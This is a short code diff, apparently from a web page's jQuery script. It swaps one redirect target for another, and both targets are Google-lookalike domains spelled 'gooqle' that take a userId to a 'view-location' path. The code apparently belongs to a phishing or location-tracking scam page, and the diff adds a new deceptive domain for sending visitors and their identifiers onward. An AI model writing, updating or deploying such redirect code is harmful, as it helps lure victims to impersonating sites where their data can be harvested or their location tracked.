@@ -97,7 +97,7 @@ $(document).ready(function () {
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://gooqle-mapass.shop/view-location/${userId}`;
+                            window.location.href = `https://view-gooqle-lives.my.id/view-location/${userId}`;
                           }
                     
                 },
